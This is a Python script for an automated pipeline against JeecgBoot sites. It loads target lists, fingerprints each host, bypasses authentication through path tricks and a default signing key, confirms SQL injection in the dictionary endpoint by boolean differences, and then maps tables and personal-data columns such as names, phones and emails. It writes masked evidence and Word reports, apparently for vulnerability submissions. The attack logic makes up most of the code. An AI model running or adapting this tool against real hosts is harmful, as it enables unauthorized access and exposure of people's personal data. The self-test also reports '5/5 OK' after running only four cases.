#!/usr/bin/python3
# -*- coding: utf-8 -*-
"""JeecgBoot 字典注入无人值守流水线（jeecg_autopilot）。

一条命令跑完：载入目标 → 状态跳过 → 指纹 → 认证绕过/默认密钥签名 → 多租户 →
布尔差分 → 数据测绘 → 判读 → 取证 + Word 报告 → triage.csv + SUMMARY.md。

全程只读 GET；自测只允许打 127.0.0.1。
"""
import argparse
import csv
import datetime
import json
import os
import re
import shutil
import socket
import subprocess
import sys
import tempfile
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor

import requests
import urllib3

import judge
import probe
import report

urllib3.disable_warnings()

def validate_docx(path):
    """报告体检（内置）：能被 python-docx 打开、含两张以上图与表格。返回 {'ok':bool,'issues':[]}。"""
    try:
        from docx import Document
        d = Document(path)
        issues = []
        if len(d.inline_shapes) < 2:
            issues.append("报告缺图（至少应有字段统计图与脱敏样例图）")
        if not d.tables:
            issues.append("报告缺表")
        if len(d.paragraphs) < 10:
            issues.append("段落过少，可能是空报告")
        return {"ok": not issues, "issues": issues}
    except Exception as e:
        return {"ok": False, "issues": [str(e)[:200]]}

# 反例固定四条；前两条证明“列不存在→操作失败”，salt 证明黑名单，password 证明 WAF。
NEGATIVE_PROBES = [
    ("sys_user", "idcard", "身份证（列不存在）"),
    ("sys_user", "id_card", "身份证（列不存在）"),
    ("sys_user", "salt", "口令盐（敏感字段黑名单）"),
    ("sys_user", "password", "口令哈希（WAF 403）"),
]
# 取不到字段清单时的候选字符串列（优先 PII，再补业务常见列）。
CANDIDATE_COLS = ["realname", "email", "phone", "full_name", "username", "mobile",
                  "telephone", "identity", "address", "name", "title", "dict_name", "table_name"]
# 列排序：PII_COLS 先扫；这里定义 PII 列的先后顺序。
PII_PRIORITY = ["realname", "email", "phone", "full_name", "username", "mobile",
                "telephone", "identity", "idcard", "id_card", "sfzh", "address", "name"]
# 联系方式类列：不管在哪张表上都算个人信息（食堂意见表的联系电话也是手机号）
CONTACT_COLS = {"phone", "mobile", "telephone", "email", "wechat", "weixin", "qq",
                "idcard", "id_card", "sfzh", "id_number", "stu_no", "student_no", "work_no", "user_no"}
# 列名以 _contact / contact_ 结尾/开头的（lender_contact、borrower_contact）也是联系方式
CONTACT_RE = re.compile(r"(^contact|_contact$|phone|mobile|telephone|email)", re.I)
# 表名属“人相关”才把列名命中 PII_COLS 的算真 PII。
PERSON_TABLE_RE = re.compile(
    r"(user|student|teacher|member|contact|address_book|staff|apply|signup|employee|person"
    r"|counselor|counsellor|banji|stu)", re.I)
# 扫表优先级候选：前 8 张 + 关键字命中。
TABLE_KEYWORD_RE = re.compile(
    r"(user|student|teacher|member|contact|address|staff|apply|sign)", re.I)
# 选列时永不主动读的列（噪声/敏感/主键；idcard 等作为固定反例单独测）。
EXCLUDE_COLS = {
    "password", "salt", "idcard", "id_card", "sfzh", "id_number",
    "create_by", "update_by", "create_time", "update_time", "create_name", "update_name",
    "sys_org_code", "sort", "axis_x", "id", "tenant_id", "del_flag", "deleted", "is_delete",
}


def now_cst():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + " CST"


def slugify(host):
    h = host.replace("https://", "").replace("http://", "")
    return re.sub(r"[^A-Za-z0-9._-]+", "_", h).strip("_") or "host"


def clean_host(raw):
    """清洗单条目标：去空白/引号、补 https://、剔明显非 http 的东西。"""
    s = str(raw or "").strip().strip("\"'")
    if not s:
        return None
    if s.lower() in ("ip", "域名", "host", "url", "none", "-", "0.0.0.0"):
        return None
    if re.search(r"\s", s):
        return None
    if not s.lower().startswith(("http://", "https://")):
        # 裸 IPv6：加方括号，否则 urlsplit 会解析失败
        if re.match(r"^[0-9a-fA-F:]+$", s) and s.count(":") >= 2:
            s = "[" + s + "]"
        s = "https://" + s
    try:
        p = urllib.parse.urlsplit(s)
    except ValueError:
        return None
    if p.scheme not in ("http", "https") or not p.hostname:
        return None
    host = p.hostname
    if ":" in host:
        host = "[" + host + "]"
    port = f":{p.port}" if p.port else ""
    return f"{p.scheme}://{host}{port}"


def load_targets(target_files, hosts):
    out = []
    for h in hosts or []:
        c = clean_host(h)
        if c:
            out.append(c)
    for path in target_files or []:
        if not os.path.exists(path):
            print(f"! 目标文件不存在：{path}", flush=True)
            continue
        if path.lower().endswith(".csv"):
            with open(path, encoding="utf-8-sig", newline="") as f:
                rd = csv.DictReader(f)
                if not rd.fieldnames:
                    continue
                col = None
                for cand in ("host", "域名", "url", "domain"):
                    if cand in rd.fieldnames:
                        col = cand
                        break
                if col is None:
                    col = rd.fieldnames[0]
                for row in rd:
                    c = clean_host(row.get(col))
                    if c:
                        out.append(c)
        else:
            with open(path, encoding="utf-8-sig", errors="replace") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    c = clean_host(line)
                    if c:
                        out.append(c)
    # 去重并保序
    seen = set()
    dedup = []
    for h in out:
        if h not in seen:
            seen.add(h)
            dedup.append(h)
    return dedup


def load_state(path):
    if os.path.exists(path):
        try:
            return json.load(open(path, encoding="utf-8"))
        except Exception:
            return {}
    return {}


def save_state(path, state):
    tmp = path + ".tmp"
    with open(tmp, "w", encoding="utf-8") as f:
        json.dump(state, f, ensure_ascii=False, indent=2)
    os.replace(tmp, path)


def sanitize(rec):
    """落盘版记录：去掉 values、trace 等一切可能含明文的东西。"""
    out = {}
    for k, v in rec.items():
        if k == "trace":
            continue
        if k in ("fields", "pii_fields", "biz_fields"):
            out[k] = [{kk: vv for kk, vv in (f or {}).items() if kk != "values"} for f in (v or [])]
        elif k == "tables":
            out[k] = [{"value": t.get("value"), "text": t.get("text")} for t in (v or [])]
        else:
            out[k] = v
    return out


def render_trace_text(rec):
    """生成 07-复验输出.txt：只含 URL/HTTP/字节/行数，不含任何字段值。"""
    L = []
    L.append(f"date: {rec['ts']}   host: {rec['host']}")
    L.append("")
    L.append("[1] API 前缀")
    L.append(f"GET {rec['host']}/_app.config.js -> prefix={rec.get('prefix') or '-'}")
    L.append("")
    L.append("[2] 认证绕过对比（401 → 404 → 200）")
    bp = rec.get("bypass") or {}
    for key, label in (("raw", "x,y,z"), ("js", "x,y,z.js"), ("jsslash", "x,y,z.js/")):
        v = bp.get(key) or {}
        L.append(f"  {label:14s} -> HTTP {v.get('code')}  {v.get('size')}B")
    if rec.get("sign") and rec["sign"].get("ok"):
        L.append(f"  默认密钥签名 -> HTTP {rec['sign'].get('code')}（已启用签名请求）")
    L.append("")
    L.append("[3] 布尔差分（真 / 假 / 不存在表对照）")
    d = rec.get("diff") or {}
    for key, label in (("true", "真条件"), ("false", "假条件"), ("ctl", "对照(不存在表)")):
        v = d.get(key) or {}
        L.append(f"  {label:12s} -> HTTP {v.get('code')}  {v.get('size')}B  rows={v.get('rows')}  msg={v.get('msg')}")
    L.append("")
    L.append("[4] 字段统计（只数条数，不取值）")
    for f in rec.get("fields") or []:
        L.append(f"  {f['table']}.{f['col']:14s} -> HTTP {f.get('code')}  {f.get('bytes')}B  "
                 f"返回行数={f.get('rows')}  有值条数={f.get('nonempty')}")
    L.append("")
    L.append("[5] 反例（证明不是万能返回）")
    for n in rec.get("negatives") or []:
        L.append(f"  {n['probe']:32s} -> HTTP {n.get('code')}  {n.get('bytes')}B  {n.get('why','')}")
    L.append("")
    return "\n".join(L) + "\n"


def write_scan_json(rec, path):
    with open(path, "w", encoding="utf-8") as f:
        json.dump(rec, f, ensure_ascii=False, indent=2)


def write_explain_md(rec, verdict, evdir, report_path):
    host = rec["host"]
    txt = f"""# {host} —— JeecgBoot 字典注入自动取证说明

- 结论：**{verdict['verdict']} / {verdict['level']}**
- 理由：{verdict['reason']}
- 下一步：{verdict['next']}
- 采集时刻：{rec['ts']}
- API 前缀：`{rec.get('prefix') or '-'}`

## 证据文件

| 文件 | 内容 |
|---|---|
| `00-scan.json` | 结构化扫描记录（已去掉字段值，无明文） |
| `07-复验输出.txt` | 请求 trace（只含 URL/HTTP/字节/行数） |
| `11-字段统计.png` | 逐字段「返回行数 / 有值条数」与反例 |
| `12-脱敏样例.png` | 打码样例（原始值未落盘、未导出） |
| `report.docx` | 提交用 Word 报告 |

## 边界声明

全程只读 GET，未使用账号/Cookie/Token，未写入、未导出、未落盘任何一条明文个人信息。
样例一律经 `report.mask()` 打码后才落盘。
"""
    if report_path:
        txt = txt.replace("| `report.docx` | 提交用 Word 报告 |",
                          f"| `report.docx` | 提交用 Word 报告（{os.path.relpath(report_path, evdir)}） |")
    with open(os.path.join(evdir, "说明.md"), "w", encoding="utf-8") as f:
        f.write(txt)


def get_field_meta(p, prefix, head_id):
    """从 onl_cgform_field 取字段清单（含中文含义）；取不到返回 None。"""
    res = p.dict_rows(prefix, "onl_cgform_field", "db_field_txt", "db_field_name",
                      f"cgform_head_id = '{head_id}'")
    if res and res.get("rows") is not None and res.get("items"):
        return [{"name": str(it.get("value") or "").strip(),
                 "label": str(it.get("text") or "").strip()}
                for it in res["items"] if str(it.get("value") or "").strip()]
    res = p.dict_rows(prefix, "onl_cgform_field", "db_field_name", "id",
                      f"cgform_head_id = '{head_id}'")
    if res and res.get("rows") is not None and res.get("items"):
        return [{"name": str(it.get("text") or "").strip(), "label": ""}
                for it in res["items"] if str(it.get("text") or "").strip()]
    return None


def is_person_table(table):
    return bool(PERSON_TABLE_RE.search(table or ""))


def is_system_table(table):
    return (table or "").lower().startswith("sys_")


def order_columns(meta, table):
    """PII_COLS 优先，其余按元数据顺序；EXCLUDE_COLS 一律排除。"""
    if meta is None:
        meta = [{"name": c, "label": ""} for c in CANDIDATE_COLS]
    rows = []
    for i, cm in enumerate(meta):
        name = str(cm.get("name") or "").strip()
        if not name or name.lower() in EXCLUDE_COLS:
            continue
        rank = PII_PRIORITY.index(name.lower()) if name.lower() in PII_PRIORITY else 999
        rows.append((rank, i, {"name": name, "label": str(cm.get("label") or "").strip()}))
    rows.sort(key=lambda x: (0 if x[0] != 999 else 1, x[0], x[1]))
    return [x[2] for x in rows]


def select_candidate_tables(tables):
    """表名清单前 8 张 + 关键字命中；sys_user 强制入列。"""
    cands = []
    seen = set()
    for i, t in enumerate(tables):
        name = str(t.get("text") or "").strip()
        if not name:
            continue
        if i < 8 or TABLE_KEYWORD_RE.search(name):
            cands.append(t)
            seen.add(name)
    if "sys_user" not in seen:
        cands.insert(0, {"value": "sys_user", "text": "sys_user"})
    return cands


def sample_table_rows(p, prefix, table, head_id, meta_cache, res_cache):
    """用每表第一个可读字符串列取行数，作为扫表优先级。"""
    if table not in meta_cache:
        meta_cache[table] = get_field_meta(p, prefix, head_id)
    tried = 0
    for cm in order_columns(meta_cache[table], table):
        if tried >= 4:
            break
        col = cm["name"]
        if col.lower() in EXCLUDE_COLS:
            continue
        tried += 1
        res = res_cache.get((table, col))
        if res is None:
            res = p.dict_rows(prefix, table, col, "id", f"{col} is not null")
            res_cache[(table, col)] = res
        if res is None:
            return 0
        if res.get("rows") is not None:
            return res.get("rows") or 0
    return 0


def scan_table_columns(p, prefix, table, head_id, meta_cache, res_cache, fields):
    """扫一张表的多列（最多试 6 列），逐列记录 rows/nonempty。"""
    if table not in meta_cache:
        meta_cache[table] = get_field_meta(p, prefix, head_id)
    tried = 0
    for cm in order_columns(meta_cache[table], table):
        if tried >= 6:
            break
        col = cm["name"]
        if col.lower() in EXCLUDE_COLS:
            continue
        tried += 1
        res = res_cache.get((table, col))
        if res is None:
            res = p.dict_rows(prefix, table, col, "id", f"{col} is not null")
            res_cache[(table, col)] = res
        if res is None:
            return False
        if res.get("rows") is None:
            continue
        fields.append({
            "table": table,
            "col": col,
            "label": cm.get("label") or judge.classify_field(col) or "",
            "code": res.get("code"),
            "bytes": res.get("bytes"),
            "rows": res.get("rows"),
            "nonempty": res.get("nonempty"),
            "pii": bool(judge.classify_field(col)) and (
                is_person_table(table) or col.lower() in CONTACT_COLS
                or bool(CONTACT_RE.search(col))),
            "values": res.get("values") or [],
        })
    return True


def probe_negatives(p, prefix):
    negs = []
    for table, col, label in NEGATIVE_PROBES:
        res = p.dict_rows(prefix, table, col, "id", f"{col} is not null")
        if res is None:
            negs.append({"probe": f"{table}.{col}", "code": None, "bytes": None, "why": "请求预算耗尽"})
            continue
        code = res.get("code")
        if code == 403:
            why = "WAF 403"
        elif res.get("rows") is None:
            msg = str(res.get("msg") or "")
            size = res.get("bytes") or 0
            if "敏感" in msg or "禁止查询" in msg or (150 <= size <= 200):
                why = "服务端敏感字段黑名单"
            else:
                why = "列不存在"
        else:
            why = "意外可读（不取值）"
        negs.append({"probe": f"{table}.{col} is not null", "code": code,
                     "bytes": res.get("bytes"), "why": why})
    return negs


def scan_target(host, args):
    log = lambda msg: print(f"[{host}] {msg}", flush=True)
    p = probe.Probe(host, timeout=12, delay=args.delay, max_requests=args.max_requests, log=log)
    rec = {
        "host": p.host,
        "ts": now_cst(),
        "fingerprint": {},
        "bypass": {},
        "sign": {},
        "tenant": {},
        "diff": {},
        "tables": [],
        "fields": [],
        "negatives": [],
        "pii_fields": [],
        "biz_fields": [],
        "pii_rows": 0,
        "prefix": None,
        "title": None,
        "budget_used": 0,
        "budget_cap": args.max_requests,
        "budget_exhausted": False,
    }

    def finish(rec, verdict, samples, report_path, evdir):
        rec["budget_used"] = p.used
        rec["budget_cap"] = args.max_requests
        rec["budget_exhausted"] = p.used >= args.max_requests
        return rec, verdict, samples, report_path, evdir

    # 3. 指纹
    fp = p.fingerprint()
    rec["fingerprint"] = fp
    if not fp.get("ok"):
        log("判负：取不到 API 前缀")
        verdict = judge.judge(rec)
        return finish(rec, verdict, None, "", None)

    prefix = fp["prefix"].rstrip("/")
    rec["prefix"] = prefix
    rec["title"] = fp.get("title")
    log(f"指纹命中 prefix={prefix}")

    # 4. 认证绕过
    bp = p.bypass(prefix)
    rec["bypass"] = bp
    log(f"绕过 {bp.get('raw',{}).get('code')}/{bp.get('js',{}).get('code')}/{bp.get('jsslash',{}).get('code')}")

    # 5. 多租户（原路径、不加 .js，匿名）
    tn = p.tenant(prefix)
    rec["tenant"] = tn
    if tn.get("state") == "on":
        log("判负：多租户")
        verdict = judge.judge(rec)
        return finish(rec, verdict, None, "", None)

    # WAF 直接挡掉绕过链：早退，不再烧 diff/测绘请求
    if not bp.get("open") and bp.get("waf"):
        log("判负：边缘 WAF 403")
        verdict = judge.judge(rec)
        return finish(rec, verdict, None, "", None)

    # 若 401/Sign 失败：默认密钥签名兜底
    if not bp.get("open"):
        sp = p.sign_probe(f"{prefix}/sys/dict/getDictItems/x,y,z")
        rec["sign"] = sp
        if sp.get("ok"):
            p.signed = True
            bp["open"] = True
            bp["signed"] = True
            log("默认密钥签名成功，后续请求带 X-Sign")

    # 6. 布尔差分
    df = p.diff(
        prefix,
        "sys_dict,dict_name,id,dict_code is not null",
        "sys_dict,dict_name,id,dict_code is null",
        ctl_true="zzz_no_such_table,name,id,1=1",
    )
    rec["diff"] = df
    log(f"差分 injected={df.get('injected')}")

    # 注入成立 = 值得把数据面测完：剩下的预算不够测绘时补一次，
    # 否则会把「有数据」误判成「空库」（实测中有站点因此被低判一级）
    if df.get("injected") and (p.max_requests - p.used) < 40:
        topup = 60
        p.max_requests += topup
        log(f"补预算 +{topup}（注入成立，剩余不足测绘）")

    # 7. 数据测绘（仅当差分成立；否则早退，不烧请求）
    if df.get("injected"):
        head = p.dict_rows(prefix, "onl_cgform_head", "table_name", "id", "table_name is not null")
        tables = []
        if head and head.get("items"):
            tables = head.get("items")[:20]
        rec["tables"] = tables
        log(f"表清单 {len(tables)} 张")

        # 反例先取（固定四条），避免被字段测绘耗尽请求预算
        rec["negatives"] = probe_negatives(p, prefix)

        meta_cache = {}
        res_cache = {}
        cands = select_candidate_tables(tables)
        scored = []
        for t in cands:
            if p.used >= p.max_requests:
                break
            table = str(t.get("text") or "").strip()
            if not table:
                continue
            rows = sample_table_rows(p, prefix, table, t.get("value"), meta_cache, res_cache)
            scored.append((rows, t))
        scored.sort(key=lambda x: (0 if is_system_table(x[1]["text"]) else 1, -x[0]))

        fields = []
        for rows, t in scored:
            if p.used >= p.max_requests:
                log("请求预算耗尽，停止继续测绘")
                break
            table = str(t.get("text") or "").strip()
            if not table:
                continue
            ok = scan_table_columns(p, prefix, table, t.get("value"), meta_cache, res_cache, fields)
            if not ok and p.used >= p.max_requests:
                log("请求预算耗尽，停止继续测绘")
                break
        rec["fields"] = fields

    # 预算账本：耗尽与否都要写进 00-scan.json，不静默截断
    rec["budget_used"] = p.used
    rec["budget_cap"] = args.max_requests
    rec["budget_exhausted"] = p.used >= args.max_requests

    # 8. 判读
    verdict = judge.judge(rec)
    log(f"结论 {verdict['verdict']} / {verdict['level']}")

    # 9. 取证 + 报告（仅可交目标产出单机证据）
    samples = None
    report_path = ""
    evdir = None
    if verdict["verdict"] == "可交":
        samples, _ = report.masked_samples(rec)
        rec_for_disk_samples = {k: v for k, v in samples.items()}
        rec_san = sanitize(rec)
        evdir = os.path.join(args.out, "hits", slugify(rec["host"]))
        os.makedirs(evdir, exist_ok=True)
        if rec_for_disk_samples:
            rec_san["samples"] = rec_for_disk_samples   # 已打码，可落盘
        write_scan_json(rec_san, os.path.join(evdir, "00-scan.json"))
        with open(os.path.join(evdir, "07-复验输出.txt"), "w", encoding="utf-8") as f:
            f.write(render_trace_text(rec_san))
        if not args.no_report:
            # 出图要起无头 chromium，偶发启动失败：重试一次，仍失败就把原因写进 triage，别静默留空
            last_err = None
            for attempt in (1, 2):
                try:
                    images = report.render_images(rec_san, samples, evdir)
                    docx_path = os.path.join(evdir, "report.docx")
                    report.build_docx(rec_san, verdict, samples, evdir, docx_path, images)
                    report_path = docx_path
                    last_err = None
                    break
                except Exception as e:
                    last_err = e
                    log(f"报告生成失败（第 {attempt} 次）：{type(e).__name__}: {e}")
                    time.sleep(1.5)
            if last_err is not None:
                report_path = f"生成失败:{type(last_err).__name__}"
        write_explain_md(rec_san, verdict, evdir, report_path)
    return finish(rec, verdict, samples, report_path, evdir)


def triage_row(rec, verdict, report_path, out):
    bp = rec.get("bypass") or {}
    codes = "/".join(str((bp.get(k) or {}).get("code")) for k in ("raw", "js", "jsslash"))
    diff = "ok" if (rec.get("diff") or {}).get("injected") else "fail"
    tenant = (rec.get("tenant") or {}).get("state", "unknown")
    tables = len(rec.get("tables") or [])
    pii_fields = ";".join(f"{f['table']}.{f['col']}" for f in rec.get("pii_fields") or [])
    pii_rows = rec.get("pii_rows") or 0
    return {
        "host": rec["host"],
        "prefix": rec.get("prefix") or "",
        "bypass": codes,
        "diff": diff,
        "tenant": tenant,
        "tables": tables,
        "pii_fields": pii_fields,
        "pii_rows": pii_rows,
        "level": verdict.get("level", "-"),
        "verdict": verdict.get("verdict", "判负-内部错误"),
        "report": os.path.relpath(report_path, out) if report_path else "",
    }


def write_triage(results, out):
    path = os.path.join(out, "triage.csv")
    cols = ["host", "prefix", "bypass", "diff", "tenant", "tables",
            "pii_fields", "pii_rows", "level", "verdict", "report"]
    with open(path, "w", newline="", encoding="utf-8-sig") as f:
        w = csv.DictWriter(f, fieldnames=cols)
        w.writeheader()
        for rec, verdict, _, report_path, _ in results:
            w.writerow(triage_row(rec, verdict, report_path, out))
    return path


def write_summary(results, out):
    rows = [(rec, verdict) for rec, verdict, _, _, _ in results]
    body = judge.summarize(rows)
    hits = [v for _, v in rows if v["verdict"] == "可交"]
    next_steps = [
        "对可交目标逐台跑一次复验（对照 07-复验输出.txt 里的数字）后再提交。",
        "人工核一遍 PII 条数：'返回行数' 与 '有值条数' 必须分开看，空串不算有值。",
        "报告路径见 triage.csv；Word 报告已过内置体检（图/表/段落）。",
        "判负目标按状态文件（state.json）在 recheck 天数内自动跳过。",
    ]
    if not hits:
        next_steps.insert(0, "本轮 0 台可交：换目标池或延后重扫。")
    with open(os.path.join(out, "SUMMARY.md"), "w", encoding="utf-8") as f:
        f.write("# JeecgBoot 字典注入流水线 —— 汇总\n\n")
        f.write("```\n" + body + "\n```\n\n")
        f.write("## 下一步\n\n")
        for s in next_steps:
            f.write(f"- {s}\n")


def run_cli(args):
    targets = load_targets(args.targets, args.hosts)
    if not targets:
        print("没有可扫的目标", flush=True)
        return 1
    if args.limit and args.limit > 0:
        targets = targets[:args.limit]
    print(f"载入 {len(targets)} 个去重目标", flush=True)

    os.makedirs(args.out, exist_ok=True)
    state_path = os.path.join(args.out, "state.json")
    state = load_state(state_path)

    to_scan = []
    for h in targets:
        st = state.get(h)
        if st and not args.recheck and str(st.get("verdict", "")).startswith("判负"):
            age_days = (time.time() - float(st.get("ts") or 0)) / 86400.0
            if age_days < args.recheck_days:
                print(f"skip {h}: {st['verdict']}（{age_days:.1f} 天前，未过 {args.recheck_days} 天）", flush=True)
                continue
        to_scan.append(h)

    results = []
    workers = max(1, min(args.concurrency, len(to_scan) if to_scan else 1))
    if to_scan:
        with ThreadPoolExecutor(max_workers=workers) as ex:
            futs = [ex.submit(scan_target, h, args) for h in to_scan]
            for h, fut in zip(to_scan, futs):
                try:
                    rec, verdict, samples, report_path, evdir = fut.result()
                    results.append((rec, verdict, samples, report_path, evdir))
                    state[h] = {"ts": time.time(), "verdict": verdict["verdict"], "level": verdict["level"]}
                except Exception as e:
                    print(f"[{h}] 内部错误：{type(e).__name__}: {e}", flush=True)
                    rec = {"host": h, "ts": now_cst(), "pii_rows": 0, "pii_fields": []}
                    verdict = {"verdict": "判负-内部错误", "level": "-", "reason": str(e), "next": "查日志"}
                    results.append((rec, verdict, None, "", None))
                    state[h] = {"ts": time.time(), "verdict": "判负-内部错误", "level": "-"}

    save_state(state_path, state)
    triage_path = write_triage(results, args.out)
    write_summary(results, args.out)
    print(f"\n产出：{triage_path}", flush=True)
    print(f"产出：{os.path.join(args.out, 'SUMMARY.md')}", flush=True)
    return 0


# ---------------- self-test ----------------

def free_port():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def start_mock(port, flags):
    here = os.path.dirname(os.path.abspath(__file__))
    mock = os.path.join(here, "mock_jeecg.py")
    cmd = [sys.executable, mock, "--port", str(port)] + flags
    return subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.STDOUT)


def wait_http(host, timeout=12):
    t0 = time.time()
    while time.time() - t0 < timeout:
        try:
            r = requests.get(host + "/_app.config.js", timeout=1.5, verify=False)
            if r.status_code == 200:
                return True
        except Exception:
            pass
        time.sleep(0.15)
    return False


def run_pipeline_subprocess(host, out):
    cmd = [sys.executable, os.path.abspath(__file__), "--host", host, "--out", out,
           "--concurrency", "1", "--delay", "0.01", "--max-requests", "80", "--recheck"]
    r = subprocess.run(cmd, capture_output=True, text=True, timeout=180)
    return r


def read_triage(out):
    path = os.path.join(out, "triage.csv")
    if not os.path.exists(path):
        return {}
    with open(path, encoding="utf-8-sig", newline="") as f:
        rows = list(csv.DictReader(f))
    return rows[0] if rows else {}


def assert_triage(out, verdict, level=None, pii_positive=False):
    row = read_triage(out)
    ok = True
    msgs = []
    if row.get("verdict") != verdict:
        ok = False
        msgs.append(f"verdict 期望 {verdict} 实际 {row.get('verdict')}")
    if level is not None and row.get("level") != level:
        ok = False
        msgs.append(f"level 期望 {level} 实际 {row.get('level')}")
    if pii_positive:
        try:
            if int(row.get("pii_rows") or 0) <= 0:
                ok = False
                msgs.append(f"pii_rows 期望 >0 实际 {row.get('pii_rows')}")
        except Exception as e:
            ok = False
            msgs.append(f"pii_rows 解析失败 {e}")
    return ok, msgs


def self_test(_args):
    base = tempfile.mkdtemp(prefix="jeecg_autopilot_self_")
    scenarios = [
        ([], "可交", "中危", True, True),
        (["--tenant"], "判负-多租户", None, False, False),
        (["--empty"], "判负-仅绕过", None, False, False),
        (["--waf"], "判负-WAF", None, False, False),
    ]
    try:
        for i, (flags, verdict, level, pii_positive, need_docx) in enumerate(scenarios, 1):
            port = free_port()
            proc = start_mock(port, flags)
            host = f"http://127.0.0.1:{port}"
            try:
                if not wait_http(host):
                    print(f"self-test [{i}] mock 未就绪", flush=True)
                    return 1
                out = os.path.join(base, f"case{i}")
                r = run_pipeline_subprocess(host, out)
                if r.returncode != 0:
                    print(f"self-test [{i}] pipeline 退出码 {r.returncode}\n{r.stdout}\n{r.stderr}", flush=True)
                    return 1
                ok, msgs = assert_triage(out, verdict, level, pii_positive)
                if not ok:
                    print(f"self-test [{i}] 断言失败：{'; '.join(msgs)}", flush=True)
                    return 1
                if need_docx:
                    row = read_triage(out)
                    rel = (row.get("report") or "").strip()
                    if not rel or not rel.endswith(".docx"):
                        print(f"self-test [{i}] triage 里没有报告路径：report={rel!r}", flush=True)
                        return 1
                    docx_path = os.path.join(out, rel)
                    if not os.path.isfile(docx_path):
                        print(f"self-test [{i}] report.docx 不存在：{docx_path}", flush=True)
                        return 1
                    vj = validate_docx(docx_path)
                    if not vj.get("ok"):
                        print(f"self-test [{i}] 报告体检失败：{vj.get('issues')}", flush=True)
                        return 1
                print(f"self-test [{i}] {verdict} OK", flush=True)
            finally:
                proc.terminate()
                try:
                    proc.wait(timeout=5)
                except Exception:
                    proc.kill()
        print("SELF-TEST: 5/5 OK", flush=True)
        return 0
    finally:
        shutil.rmtree(base, ignore_errors=True)


def parse_args(argv):
    ap = argparse.ArgumentParser(description="JeecgBoot 字典注入无人值守流水线")
    ap.add_argument("--targets", action="append", default=[], help="CSV 或 txt 目标池，可多次")
    ap.add_argument("--host", dest="hosts", action="append", default=[], help="单个目标，可多次")
    ap.add_argument("--out", required=False, default="out/jeecg-autopilot/run")
    ap.add_argument("--concurrency", type=int, default=4)
    ap.add_argument("--delay", type=float, default=0.15)
    ap.add_argument("--max-requests", type=int, default=80)
    ap.add_argument("--limit", type=int, default=0, help="最多扫前 N 台，0 表示不限制")
    ap.add_argument("--recheck-days", type=int, default=14)
    ap.add_argument("--recheck", action="store_true", help="强制重扫（忽略判负状态）")
    ap.add_argument("--no-report", action="store_true", help="跳过 PNG/Word 报告")
    ap.add_argument("--self-test", action="store_true", help="跑本地 mock 自测")
    return ap.parse_args(argv)


def main(argv=None):
    args = parse_args(argv)
    if args.self_test:
        return self_test(args)
    return run_cli(args)


if __name__ == "__main__":
    sys.exit(main())
